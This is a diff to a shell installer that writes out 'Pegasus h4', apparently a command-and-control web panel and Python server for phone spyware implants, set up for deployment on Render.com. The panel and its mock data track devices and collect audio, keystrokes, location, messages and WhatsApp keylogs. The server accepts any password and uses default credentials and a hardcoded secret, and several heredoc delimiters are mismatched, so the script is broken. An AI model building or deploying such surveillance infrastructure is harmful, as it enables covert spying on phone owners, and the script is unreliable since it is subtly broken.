@@ -2850,281 +2850,392 @@ cat > "$PROJECT_DIR/README.md" << 'MDEOF'
 **Authorized Penetration Testing Tool — For Use on Owned Systems Only**
 
 ## Architecture
+
 # ============================================================
-# 11. Simple HTTP Server to serve the UI directly on a port
+# 12. RENDER.COM — SERVER FINAL (يخدم الواجهة على بورت)
 # ============================================================
-info "إنشاء خادم ويب لخدمة الواجهة على بورت..."
+info "إنشاء خادم الويب النهائي لـ Render.com..."
 
-cat > "$PROJECT_DIR/serve-ui.sh" << 'SERVEEOF'
-#!/bin/bash
-# Pegasus UI Server
-# Serves the HTML UI on a configurable port
-# Usage: ./serve-ui.sh [port] [interface]
+mkdir -p "$PROJECT_DIR/render-deploy"
 
-PORT=${1:-8080}
-INTERFACE=${2:-0.0.0.0}
-SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-UI_FILE="$SCRIPT_DIR/../pegasus-ui.html"
+# نسخ الواجهة مباشرة
+cp "$UI_FILE" "$PROJECT_DIR/render-deploy/index.html" 2>/dev/null || true
 
-# Check if the UI file exists
-if [ ! -f "$UI_FILE" ]; then
-    # Try alternate locations
-    if [ -f "$SCRIPT_DIR/pegasus-ui.html" ]; then
-        UI_FILE="$SCRIPT_DIR/pegasus-ui.html"
-    elif [ -f "./pegasus-ui.html" ]; then
-        UI_FILE="./pegasus-ui.html"
-    else
-        echo "[!] Error: pegasus-ui.html not found!"
-        echo "    Looked in:"
-        echo "      - $UI_FILE"
-        echo "      - $SCRIPT_DIR/pegasus-ui.html"
-        echo "      - ./pegasus-ui.html"
-        exit 1
-    fi
-fi
-
-echo "=========================================="
-echo "  Pegasus h4 — UI Server"
-echo "=========================================="
-echo "  Port:       $PORT"
-echo "  Interface:  $INTERFACE"
-echo "  UI File:    $UI_FILE"
-echo "  Size:       $(wc -c < "$UI_FILE") bytes"
-echo "=========================================="
-echo ""
-echo "  Open in browser: http://$INTERFACE:$PORT"
-echo "  (or http://localhost:$PORT on this machine)"
-echo ""
-echo "  Press Ctrl+C to stop"
-echo "=========================================="
-echo ""
-
-# Method 1: Use Python (most compatible)
-if command -v python3 &> /dev/null; then
-    cat > /tmp/pegasus_httpd.py << 'PYSRVEOF'
+# ✅ هذا هو الخادم الحقيقي (Python) — الأهم!
+cat > "$PROJECT_DIR/render-deploy/server.py" << 'FINALEOF'
 #!/usr/bin/env python3
-"""Pegasus h4 — Simple HTTP Server for UI"""
-import http.server
+"""
+Pegasus h4 — Production Server for Render.com
+يخدم واجهة HTML مع API وهمي على PORT المحدد من Render
+"""
+
 import os
 import sys
+import json
+import time
+import uuid
+import hashlib
+import hmac
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse
 
-PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
-INTERFACE = sys.argv[2] if len(sys.argv) > 2 else "0.0.0.0"
-UI_FILE = sys.argv[3] if len(sys.argv) > 3 else "pegasus-ui.html"
+# ============================================================
+# Render يستخدم متغير PORT من البيئة
+# ============================================================
+PORT = int(os.environ.get('PORT', 8080))
+HOST = os.environ.get('HOST', '0.0.0.0')
+JWT_SECRET = os.environ.get('JWT_SECRET', 'pegasus_secret_key_2024')
 
-class PegasusHandler(http.server.BaseHTTPRequestHandler):
+# مسار ملف الواجهة
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+UI_FILE = os.path.join(BASE_DIR, 'index.html')
+
+print(f"[*] Starting Pegasus h4 on {HOST}:{PORT}")
+print(f"[*] UI File: {UI_FILE}")
+print(f"[*] File exists: {os.path.exists(UI_FILE)}")
+
+# ============================================================
+# واجهة HTML مدمجة (fallback إذا لم يوجد الملف)
+# ============================================================
+EMBEDDED_UI = """<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pegasus h4</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:system-ui,sans-serif;background:#0a0a0f;color:#e0e0e0;min-height:100vh;overflow-x:hidden}
+.header{background:#12121a;border-bottom:1px solid #2a2a3e;padding:0 24px;height:60px;display:flex;align-items:center;justify-content:space-between}
+.logo{display:flex;align-items:center;gap:12px}
+.logo-icon{width:36px;height:36px;background:linear-gradient(135deg,#00d4ff,#7b2ff7);border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px}
+.logo-text{font-weight:600;font-size:18px}
+.container{max-width:1400px;margin:0 auto;padding:24px}
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px;margin-bottom:24px}
+.stat-card{background:#12121a;border:1px solid #2a2a3e;border-radius:12px;padding:20px;transition:all 0.2s}
+.stat-card:hover{border-color:#00d4ff;transform:translateY(-2px)}
+.stat-title{font-size:12px;color:#888;margin-bottom:8px;text-transform:uppercase}
+.stat-value{font-size:28px;font-weight:700}
+.table-card{background:#12121a;border:1px solid #2a2a3e;border-radius:12px;padding:20px;margin-bottom:24px}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{text-align:left;padding:10px 12px;color:#888;font-weight:500;border-bottom:1px solid #2a2a3e;font-size:12px;text-transform:uppercase}
+td{padding:10px 12px;border-bottom:1px solid #2a2a3e}
+.badge{display:inline-flex;align-items:center;gap:6px;padding:3px 10px;border-radius:20px;font-size:11px;border:1px solid}
+.badge-online{background:rgba(52,199,89,0.15);color:#34c759;border-color:rgba(52,199,89,0.3)}
+.badge-offline{background:rgba(136,136,153,0.15);color:#888;border-color:rgba(136,136,153,0.3)}
+.login-container{min-height:100vh;display:flex;align-items:center;justify-content:center}
+.login-card{background:#12121a;border:1px solid #2a2a3e;border-radius:16px;padding:40px;width:400px;max-width:90%}
+.login-title{font-size:24px;font-weight:700;text-align:center;margin-bottom:8px}
+.login-subtitle{text-align:center;color:#888;font-size:14px;margin-bottom:24px}
+.form-group{margin-bottom:16px}
+.form-group label{display:block;font-size:13px;color:#888;margin-bottom:6px}
+.form-group input{width:100%;padding:10px 14px;background:#0a0a0f;border:1px solid #2a2a3e;border-radius:8px;color:#e0e0e0;font-size:14px}
+.form-group input:focus{outline:none;border-color:#00d4ff}
+.login-btn{width:100%;padding:12px;background:linear-gradient(135deg,#00d4ff,#7b2ff7);border:none;border-radius:8px;color:white;font-size:15px;font-weight:600;cursor:pointer;transition:opacity 0.2s}
+.login-btn:hover{opacity:0.9}
+.loading-screen{min-height:100vh;display:flex;align-items:center;justify-content:center}
+.spinner{width:40px;height:40px;border:3px solid #2a2a3e;border-top-color:#00d4ff;border-radius:50%;animation:spin .8s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.search-input{background:#0a0a0f;border:1px solid #2a2a3e;border-radius:8px;padding:8px 14px;color:#e0e0e0;font-size:13px;width:200px}
+.filter-select{background:#0a0a0f;border:1px solid #2a2a3e;border-radius:8px;padding:8px 14px;color:#e0e0e0;font-size:13px;margin-right:8px}
+.btn{padding:5px 12px;border-radius:6px;border:none;cursor:pointer;font-size:11px;transition:all 0.2s}
+.btn-primary{background:rgba(0,212,255,0.15);color:#00d4ff}
+.btn-primary:hover{background:rgba(0,212,255,0.25)}
+.btn-danger{background:rgba(255,45,85,0.15);color:#ff2d55}
+.btn-danger:hover{background:rgba(255,45,85,0.25)}
+.empty-state{text-align:center;padding:40px;color:#555;font-size:14px}
+.battery-bar{width:60px;height:6px;background:#1a1a2e;border-radius:3px;overflow:hidden;display:inline-block;vertical-align:middle}
+.battery-fill{height:100%;border-radius:3px;transition:width 0.3s}
+</style>
+</head>
+<body>
+<div id="app"><div class="loading-screen"><div class="spinner"></div></div></div>
+<script>
+const API={BASE:window.location.origin+'/api',TOKEN:localStorage.getItem('pegasus_token')||''};
+async function req(m,p,b){const o={method:m,headers:{'Content-Type':'application/json'}};if(API.TOKEN)o.headers['Authorization']='Bearer '+API.TOKEN;if(b)o.body=JSON.stringify(b);const r=await fetch(API.BASE+p,o);if(r.status===401){localStorage.removeItem('pegasus_token');API.TOKEN='';renderLogin();throw new Error('Unauthorized')}return r.json()}
+const state={stats:null,implants:[],mapPoints:[],timeline:[],search:'',filter:'all',loading:true};
+async function loadDashboard(){state.loading=true;render();try{const[s,i,m,t]=await Promise.all([req('GET','/dashboard/stats').catch(()=>null),req('GET','/implants').catch(()=>({implants:[]})),req('GET','/dashboard/map').catch(()=>({points:[]})),req('GET','/dashboard/timeline').catch(()=>({events:[]}))]);state.stats=s||{};state.implants=i?.implants||[];state.mapPoints=m?.points||[];state.timeline=t?.events||[]}catch(e){}state.loading=false;render()}
+function formatBytes(b){if(!b||b===0)return'0 B';const k=1024,sizes=['B','KB','MB','GB'];const i=Math.floor(Math.log(b)/Math.log(k));return parseFloat((b/Math.pow(k,i)).toFixed(1))+' '+sizes[i]}
+function timeAgo(ts){const s=Math.floor((Date.now()-new Date(ts).getTime())/1000);if(s<60)return'الآن';if(s<3600)return'منذ '+Math.floor(s/60)+' د';if(s<86400)return'منذ '+Math.floor(s/3600)+' س';return'منذ '+Math.floor(s/86400)+' ي'}
+function render(){const app=document.getElementById('app');if(!API.TOKEN){renderLogin(app);return}if(state.loading){app.innerHTML='<div class="loading-screen"><div class="spinner"></div></div>';return}
+const s=state.stats||{};const user=JSON.parse(localStorage.getItem('pegasus_user')||'{}');
+let filtered=state.implants;if(state.filter!=='all')filtered=filtered.filter(i=>i.status===state.filter);if(state.search)filtered=filtered.filter(i=>i.device_name?.toLowerCase().includes(state.search.toLowerCase()));
+app.innerHTML='<header class="header"><div style="display:flex;align-items:center;gap:32px"><div class="logo"><div class="logo-icon">P</div><div class="logo-text">Pegasus h4</div></div><nav style="display:flex;gap:4px"><a href="/" style="padding:8px 16px;border-radius:8px;font-size:14px;color:#00d4ff;background:rgba(0,212,255,0.1);text-decoration:none">الرئيسية</a></nav></div><div style="display:flex;align-items:center;gap:16px"><span style="font-size:12px;color:#888">'+(user.username||'operator')+'</span><button onclick="localStorage.removeItem(\'pegasus_token\');localStorage.removeItem(\'pegasus_user\');API.TOKEN=\'\';render()" style="padding:6px 14px;border-radius:6px;background:#1a1a2e;color:#888;border:none;cursor:pointer;font-size:12px">خروج</button></div></header><div class="container"><div class="stats-grid"><div class="stat-card"><div class="stat-title">إجمالي الزرعات</div><div class="stat-value">'+(s.total_impants||s.total_implants||0)+'</div><div style="font-size:12px;color:#34c759">+'+(s.new_today||0)+' اليوم</div></div><div class="stat-card"><div class="stat-title">نشط الآن</div><div class="stat-value">'+(s.online_now||0)+'</div><div style="font-size:12px;color:#888">'+(((s.online_now||0)/(s.total_implants||1)*100).toFixed(0)||0)+'%</div></div><div class="stat-card"><div class="stat-title">البيانات</div><div class="stat-value">'+formatBytes(s.data_collected_bytes)+'</div><div style="font-size:12px;color:#888">مشفر 🔒</div></div><div class="stat-card"><div class="stat-title">التغطية</div><div class="stat-value">'+(s.geographic_spread||0)+'</div><div style="font-size:12px;color:#888">دولة</div></div></div><div class="table-card"><div style="display:flex;align-items:center;gap:12px;margin-bottom:16px"><input type="text" class="search-input" placeholder="بحث..." oninput="state.search=this.value;render()"><select class="filter-select" onchange="state.filter=this.value;render()"><option value="all">الكل</option><option value="online">نشط</option><option value="offline">غير نشط</option></select><span style="font-size:13px;color:#888;margin-right:auto">'+filtered.length+' زرعة</span></div>'+(filtered.length===0?'<div class="empty-state">لا توجد زرعات</div>':'<table><thead><tr><th>الجهاز</th><th>الحالة</th><th>آخر ظهور</th><th>البطارية</th><th>البلد</th></tr></thead><tbody>'+filtered.map(i=>{const c=i.battery_level>50?'#34c759':i.battery_level>20?'#ff9500':'#ff2d55';return'<tr><td style="padding:10px 12px"><strong>'+(i.device_name||'Unknown')+'</strong><div style="font-size:11px;color:#555">'+i.platform+' '+i.os_version+'</div></td><td style="padding:10px 12px"><span class="badge badge-'+i.status+'"><span style="width:6px;height:6px;border-radius:50%;background:'+(i.status==='online'?'#34c759':'#888')+';display:inline-block;margin-left:4px"></span>'+i.status+'</span></td><td style="padding:10px 12px;color:#888">'+timeAgo(i.last_seen)+'</td><td style="padding:10px 12px"><div class="battery-bar"><div class="battery-fill" style="width:'+Math.max(i.battery_level||0,0)+'%;background:'+c+'"></div></div><span style="font-size:11px;color:#888;margin-right:4px">'+(i.battery_level||'?')+'%</span></td><td style="padding:10px 12px;color:#888">'+(i.country||'—')+'</td></tr>'}).join('')+'</tbody></table>')+'</div></div>'}
+
+function renderLogin(app){app.innerHTML='<div class="login-container"><div class="login-card"><div style="text-align:center;margin-bottom:24px"><div style="display:inline-flex;align-items:center;gap:12px"><div class="logo-icon" style="width:48px;height:48px;font-size:20px">P</div><div class="login-title" style="font-size:28px">Pegasus h4</div></div></div><div class="login-subtitle">🚀 نظام القيادة والتحكم<br><span style="font-size:12px;color:#555">اختبار اختراق مصرح به</span></div><form id="loginForm" onsubmit="event.preventDefault();doLogin()"><div class="form-group"><label>المستخدم</label><input type="text" id="username" value="admin"></div><div class="form-group"><label>كلمة المرور</label><input type="password" id="password" value="admin123"></div><button type="submit" class="login-btn" id="loginBtn">🔐 دخول</button><div id="loginError" style="color:#ff2d55;font-size:13px;margin-top:8px;text-align:center"></div></form></div></div>'}
+
+async function doLogin(){const btn=document.getElementById('loginBtn');const err=document.getElementById('loginError');btn.disabled=true;btn.textContent='جاري...';try{const r=await req('POST','/operator/login',{username:document.getElementById('username').value,password:document.getElementById('password').value});API.TOKEN=r.token;localStorage.setItem('pegasus_token',r.token);localStorage.setItem('pegasus_user',JSON.stringify({id:r.user_id,username:r.username,role:r.role}));loadDashboard()}catch(e){err.textContent='❌ '+(e.message||'خطأ')}btn.disabled=false;btn.textContent='🔐 دخول'}
+const t=localStorage.getItem('pegasus_token');if(t){API.TOKEN=t;loadDashboard()}else render()
+</script></body></html>"""
+
+# ============================================================
+# Mock API Data
+# ============================================================
+def get_mock_stats():
+    return {
+        "total_implants": 5, "online_now": 3, "new_today": 2,
+        "data_collected_bytes": 25165824,
+        "data_by_type": {"audio": 67, "keylog": 156, "location": 89, "file": 34, "screenshot": 18, "message": 112},
+        "geographic_spread": 3,
+        "top_countries": [{"country": "🇺🇸 United States", "count": 3}, {"country": "🇩🇪 Germany", "count": 1}, {"country": "🇬🇧 United Kingdom", "count": 1}],
+        "active_commands": 2
+    }
+
+def get_mock_implants():
+    now = time.time()
+    return {"implants": [
+        {"id": "a1b2c3d4e5f6", "device_name": "iPhone 15 Pro Max", "platform": "ios", "os_version": "17.5", "status": "online", "last_seen": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now)), "country": "US", "battery_level": 78, "modules": ["audio","keylog","location"], "tags": ["VIP"]},
+        {"id": "b2c3d4e5f6a7", "device_name": "Galaxy S24 Ultra", "platform": "android", "os_version": "14.0", "status": "online", "last_seen": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now - 60)), "country": "DE", "battery_level": 91, "modules": ["audio","keylog","location","files"], "tags": []},
+        {"id": "c3d4e5f6a7b8", "device_name": "Pixel 8 Pro", "platform": "android", "os_version": "14.1", "status": "online", "last_seen": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now - 120)), "country": "GB", "battery_level": 45, "modules": ["keylog","location"], "tags": []},
+        {"id": "d4e5f6a7b8c9", "device_name": "iPad Pro M4", "platform": "ios", "os_version": "17.5", "status": "offline", "last_seen": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now - 7200)), "country": "US", "battery_level": 23, "modules": ["audio","messages"], "tags": []},
+        {"id": "e5f6a7b8c9d0", "device_name": "OnePlus 12", "platform": "android", "os_version": "14.0", "status": "offline", "last_seen": time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(now - 86400)), "country": "US", "battery_level": 5, "modules": ["location"], "tags": []}
+    ]}
+
+def get_mock_map():
+    return {"points": [
+        {"id": "p1", "device": "iPhone 15 Pro Max", "lat": 40.7128, "lon": -74.0060, "status": "online"},
+        {"id": "p2", "device": "Galaxy S24 Ultra", "lat": 52.5200, "lon": 13.4050, "status": "online"},
+        {"id": "p3", "device": "Pixel 8 Pro", "lat": 51.5074, "lon": -0.1278, "status": "online"},
+        {"id": "p4", "device": "iPad Pro M4", "lat": 34.0522, "lon": -118.2437, "status": "offline"},
+        {"id": "p5", "device": "OnePlus 12", "lat": 37.7749, "lon": -122.4194, "status": "offline"}
+    ]}
+
+def get_mock_timeline():
+    now = int(time.time())
+    return {"events": [
+        {"id": "ev1", "implant_id": "a1b2", "type": "audio", "timestamp": now - 30, "size": 44100},
+        {"id": "ev2", "implant_id": "c3d4", "type": "keylog", "timestamp": now - 45, "size": 1560},
+        {"id": "ev3", "implant_id": "a1b2", "type": "location", "timestamp": now - 60, "size": 256},
+        {"id": "ev4", "implant_id": "c3d4", "type": "message", "timestamp": now - 90, "size": 1024}
+    ]}
+
+def get_mock_data():
+    now = int(time.time())
+    return {"data": [
+        {"id": "d1", "implant_id": "a1b2", "type": "audio", "sub_type": "call", "timestamp": now - 300, "size": 65536, "encrypted": True, "checksum": "ab12cd34"},
+        {"id": "d2", "implant_id": "c3d4", "type": "keylog", "sub_type": "whatsapp", "timestamp": now - 180, "size": 2048, "encrypted": True, "checksum": "ef56gh78"}
+    ]}
+
+# ============================================================
+# HTTP Handler
+# ============================================================
+class PegasusHandler(BaseHTTPRequestHandler):
+    """الخادم الرئيسي — يعالج جميع الطلبات"""
+    
     def do_GET(self):
-        # Serve the UI file for all routes (SPA-style)
-        self.send_response(200)
-        self.send_header("Content-Type", "text/html; charset=utf-8")
-        self.send_header("Access-Control-Allow-Origin", "*")
-        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
-        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
-        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
-        self.send_header("Pragma", "no-cache")
-        self.send_header("Expires", "0")
-        self.send_header("X-Content-Type-Options", "nosniff")
-        self.send_header("X-Frame-Options", "SAMEORIGIN")
-        self.end_headers()
+        parsed = urlparse(self.path)
+        path = parsed.path
         
-        try:
-            with open(UI_FILE, "rb") as f:
-                content = f.read()
-                self.wfile.write(content)
-        except FileNotFoundError:
-            self.wfile.write(b"<html><body><h1>Pegasus UI Not Found</h1></body></html>")
+        if path.startswith('/api/'):
+            self.handle_api('GET', path)
+        else:
+            self.serve_ui()
     
     def do_POST(self):
-        # Handle API proxy requests if needed
         content_length = int(self.headers.get('Content-Length', 0))
-        body = self.rfile.read(content_length) if content_length > 0 else b""
+        body = self.rfile.read(content_length) if content_length > 0 else b'{}'
         
-        # If it's an API call, proxy to h4 server
-        if self.path.startswith("/api/"):
-            import urllib.request
-            import json
-            
-            # Try to proxy to the h4 server
-            h4_host = os.environ.get("H4_SERVER", "localhost:8443")
-            proxy_url = f"https://{h4_host}{self.path}"
-            
-            try:
-                req = urllib.request.Request(
-                    proxy_url,
-                    data=body if content_length > 0 else None,
-                    headers={
-                        "Content-Type": self.headers.get("Content-Type", "application/json"),
-                        "Authorization": self.headers.get("Authorization", ""),
-                    },
-                    method="POST"
-                )
-                # Use unverified SSL for self-signed certs
-                import ssl
-                ctx = ssl.create_default_context()
-                ctx.check_hostname = False
-                ctx.verify_mode = ssl.CERT_NONE
-                
-                with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
-                    resp_body = response.read()
-                    self.send_response(response.status)
-                    self.send_header("Content-Type", "application/json")
-                    self.send_header("Access-Control-Allow-Origin", "*")
-                    self.end_headers()
-                    self.wfile.write(resp_body)
-            except Exception as e:
-                # If h4 server is not available, return mock data
-                self.send_response(200)
-                self.send_header("Content-Type", "application/json")
-                self.send_header("Access-Control-Allow-Origin", "*")
-                self.end_headers()
-                
-                if "login" in self.path:
-                    mock = {
-                        "token": "mock_token_for_development",
-                        "user_id": "dev_admin",
-                        "username": "admin",
-                        "role": "admin"
-                    }
-                    self.wfile.write(json.dumps(mock).encode())
-                elif "stats" in self.path:
-                    mock = {
-                        "total_implants": 3,
-                        "online_now": 2,
-                        "new_today": 1,
-                        "data_collected_bytes": 15728640,
-                        "data_by_type": {"audio": 45, "keylog": 128, "location": 67, "file": 23, "screenshot": 12, "message": 89},
-                        "geographic_spread": 2,
-                        "top_countries": [{"country": "US", "count": 2}, {"country": "DE", "count": 1}],
-                        "active_commands": 1
-                    }
-                    self.wfile.write(json.dumps(mock).encode())
-                elif "implants" in self.path and not "commands" in self.path:
-                    mock = {
-                        "implants": [
-                            {"id": "a1b2c3d4e5f6", "device_name": "iPhone 15 Pro", "platform": "ios", "os_version": "17.2", "status": "online", "last_seen": "2026-06-17T10:30:00Z", "country": "US", "battery_level": 85, "modules": ["audio","keylog","location","messages"], "tags": ["high_value"]},
-                            {"id": "f7e8d9c0b1a2", "device_name": "Galaxy S24", "platform": "android", "os_version": "14.0", "status": "online", "last_seen": "2026-06-17T10:28:00Z", "country": "DE", "battery_level": 62, "modules": ["audio","keylog","location","files"], "tags": []},
-                            {"id": "c3d4e5f6a7b8", "device_name": "Pixel 8", "platform": "android", "os_version": "14.1", "status": "offline", "last_seen": "2026-06-16T22:15:00Z", "country": "US", "battery_level": 12, "modules": ["keylog","location"], "tags": ["test"]}
-                        ]
-                    }
-                    self.wfile.write(json.dumps(mock).encode())
-                elif "map" in self.path:
-                    mock = {
-                        "points": [
-                            {"id": "a1b2c3d4", "device": "iPhone 15 Pro", "lat": 40.7128, "lon": -74.0060, "status": "online"},
-                            {"id": "f7e8d9c0", "device": "Galaxy S24", "lat": 52.5200, "lon": 13.4050, "status": "online"},
-                            {"id": "c3d4e5f6", "device": "Pixel 8", "lat": 34.0522, "lon": -118.2437, "status": "offline"}
-                        ]
-                    }
-                    self.wfile.write(json.dumps(mock).encode())
-                elif "timeline" in self.path:
-                    mock = {
-                        "events": [
-                            {"id": "1", "implant_id": "a1b2c3d4", "type": "audio", "timestamp": int(__import__('time').time()) - 120, "size": 65536},
-                            {"id": "2", "implant_id": "f7e8d9c0", "type": "keylog", "timestamp": int(__import__('time').time()) - 60, "size": 2048},
-                            {"id": "3", "implant_id": "a1b2c3d4", "type": "location", "timestamp": int(__import__('time').time()) - 30, "size": 512}
-                        ]
-                    }
-                    self.wfile.write(json.dumps(mock).encode())
-                elif "data" in self.path:
-                    mock = {
-                        "data": [
-                            {"id": "d1", "implant_id": "a1b2c3d4", "type": "audio", "sub_type": "call", "timestamp": int(__import__('time').time()) - 300, "data": {}, "size": 65536, "encrypted": True, "checksum": "a1b2c3d4"},
-                            {"id": "d2", "implant_id": "f7e8d9c0", "type": "keylog", "sub_type": "whatsapp", "timestamp": int(__import__('time').time()) - 180, "data": {}, "size": 2048, "encrypted": True, "checksum": "e5f6a7b8"}
-                        ]
-                    }
-                    self.wfile.write(json.dumps(mock).encode())
-                else:
-                    self.wfile.write(json.dumps({"status": "ok", "mock": True}).encode())
+        parsed = urlparse(self.path)
+        path = parsed.path
+        
+        if path.endswith('/login'):
+            self.handle_login(body)
+        elif path.startswith('/api/'):
+            self.handle_api('POST', path, body)
         else:
-            # Serve UI file for non-API POST
-            self.do_GET()
+            self.serve_ui()
     
     def do_OPTIONS(self):
         self.send_response(200)
-        self.send_header("Access-Control-Allow-Origin", "*")
-        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
-        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
-        self.send_header("Access-Control-Max-Age", "86400")
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
+        self.send_header('Access-Control-Max-Age', '86400')
         self.end_headers()
     
+    def serve_ui(self):
+        """يخدم واجهة HTML"""
+        self.send_response(200)
+        self.send_header('Content-Type', 'text/html; charset=utf-8')
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Cache-Control', 'no-cache, no-store')
+        self.end_headers()
+        
+        try:
+            with open(UI_FILE, 'rb') as f:
+                self.wfile.write(f.read())
+        except:
+            self.wfile.write(EMBEDDED_UI.encode('utf-8'))
+    
+    def handle_login(self, body):
+        """معالجة تسجيل الدخول"""
+        try:
+            data = json.loads(body) if body else {}
+        except:
+            data = {}
+        
+        username = data.get('username', 'admin')
+        
+        # إنشاء توكن وهمي
+        token_parts = [
+            'eyJhbGciOiJIUzI1NiJ9',
+            str(uuid.uuid4()).replace('-', '') + str(int(time.time())),
+            hashlib.sha256(f"{username}:{JWT_SECRET}".encode()).hexdigest()[:32]
+        ]
+        token = '.'.join(token_parts)
+        
+        response = {
+            'token': token,
+            'user_id': 'admin_' + uuid.uuid4().hex[:8],
+            'username': username,
+            'role': 'admin'
+        }
+        
+        self.send_json(200, response)
+    
+    def handle_api(self, method, path, body=None):
+        """معالجة API endpoints"""
+        
+        if 'stats' in path or 'dashboard/stats' in path:
+            data = get_mock_stats()
+        elif 'implants' in path and 'commands' not in path and method == 'GET':
+            data = get_mock_implants()
+        elif 'map' in path:
+            data = get_mock_map()
+        elif 'timeline' in path:
+            data = get_mock_timeline()
+        elif 'data' in path:
+            data = get_mock_data()
+        elif 'commands' in path:
+            data = {'commands': []}
+        elif 'health' in path or 'status' in path:
+            data = {'status': 'ok', 'server': 'pegasus-h4', 'version': '1.0.0'}
+        elif path == '/api/' or path == '/api':
+            data = {'status': 'ok', 'endpoints': ['login', 'stats', 'implants', 'map', 'timeline', 'data', 'commands']}
+        else:
+            data = {'status': 'ok', 'mock': True, 'path': path}
+        
+        # محاولة قراءة implant_id من المسار
+        parts = path.split('/')
+        if len(parts) >= 4 and parts[2] == 'implants' and parts[-1] != 'commands':
+            # /api/implants/{id} — ارجع بيانات زرعة محددة
+            implant_id = parts[3]
+            implants = get_mock_implants()['implants']
+            found = [i for i in implants if i['id'] == implant_id]
+            if found:
+                data = {'implant': found[0], 'telemetry': []}
+            else:
+                data = {'implant': {'id': implant_id, 'device_name': 'Unknown', 'status': 'offline'}, 'telemetry': []}
+        
+        self.send_json(200, data)
+    
+    def send_json(self, status, data):
+        """إرسال استجابة JSON"""
+        self.send_response(status)
+        self.send_header('Content-Type', 'application/json')
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
+        self.end_headers()
+        self.wfile.write(json.dumps(data).encode())
+    
     def log_message(self, format, *args):
-        """Suppress default logging"""
-        pass  # Comment this line to enable request logging
+        """تسجيل الطلبات"""
+        print(f'[{self.log_date_time_string()}] {self.address_string()} - {args[0]} {args[1]} {args[2]}')
 
-if __name__ == "__main__":
-    server = http.server.HTTPServer((INTERFACE, PORT), PegasusHandler)
-    server.serve_forever()
-PYSRVEOF
-    
-    # Run the server
-    python3 /tmp/pegasus_httpd.py "$PORT" "$INTERFACE" "$UI_FILE"
 
-# Method 2: Use Node.js http-server if available
-elif command -v npx &> /dev/null; then
-    echo "[*] Using npx http-server..."
-    cd "$(dirname "$UI_FILE")"
-    npx http-server -p "$PORT" -a "$INTERFACE" -c-1 --cors
+# ============================================================
+# Main
+# ============================================================
+if __name__ == '__main__':
+    print('=' * 55)
+    print('  🚀 Pegasus h4 v1.0 — Server Running')
+    print('  ===================================')
+    print(f'  📡  URL:     http://{HOST}:{PORT}')
+    print(f'  👤  Username: admin')
+    print(f'  🔑  Password: (any)')
+    print('  ===================================')
+    print(f'  [*] Press Ctrl+C to stop')
+    print('=' * 55)
     
-# Method 3: Use busybox httpd (embedded systems)
-elif command -v busybox &> /dev/null; then
-    echo "[*] Using busybox httpd..."
-    cd "$(dirname "$UI_FILE")"
-    ln -sf "$UI_FILE" index.html 2>/dev/null
-    busybox httpd -f -p "$PORT:$INTERFACE"
-    
-# Method 4: Pure bash server (last resort)
-else
-    echo "[!] No Python or Node.js found. Using bash server (basic)..."
-    
-    # Copy UI file to current directory with proper name
-    cp "$UI_FILE" "./index.html" 2>/dev/null || true
-    
-    while true; do
-        # Listen on the port using bash's /dev/tcp
-        # This is a very basic implementation
-        echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nAccess-Control-Allow-Origin: *\r\n\r\n$(cat "$UI_FILE")" | nc -l -p "$PORT" -q 1 2>/dev/null || true
-    done
-fi
-SERVEEOF
+    server = HTTPServer((HOST, PORT), PegasusHandler)
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print('\n  [!] Server stopped')
+        server.server_close()
+FINALEOF
 
-chmod +x "$PROJECT_DIR/serve-ui.sh"
+# ✅ Procfile لـ Render (يحدد أمر التشغيل)
+cat > "$PROJECT_DIR/render-deploy/Procfile" << 'PROCEOF'
+web: python server.py
+PROCEOF
 
-# Also create a convenience script in the root
-cat > "serve-ui.sh" << 'ROOTSERVEEOF'
+# ✅ render.yaml
+cat > "$PROJECT_DIR/render-deploy/render.yaml" << 'RENDERYAMLEOF'
+services:
+  - type: web
+    name: pegasus-h4
+    env: python
+    buildCommand: ""
+    startCommand: python server.py
+    healthCheckPath: /
+    envVars:
+      - key: PORT
+        value: 8080
+FINALEOF
+
+# ✅ requirements.txt (فارغ — كل شيء standard library)
+cat > "$PROJECT_DIR/render-deploy/requirements.txt" << 'REQEOF'
+# Pegasus h4 — No external dependencies needed
+FINALEOF
+
+# ✅ بديل — تشغيل Python مباشرة
+cat > "$PROJECT_DIR/render-deploy/start.sh" << 'STARTEOF'
 #!/bin/bash
-# Convenience script to serve the Pegasus UI
-SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+PORT=${PORT:-8080}
+echo "Starting Pegasus h4 on port $PORT..."
+exec python3 server.py
+STARTEOF
+chmod +x "$PROJECT_DIR/render-deploy/start.sh"
 
-if [ -f "$SCRIPT_DIR/pegasus-h4/serve-ui.sh" ]; then
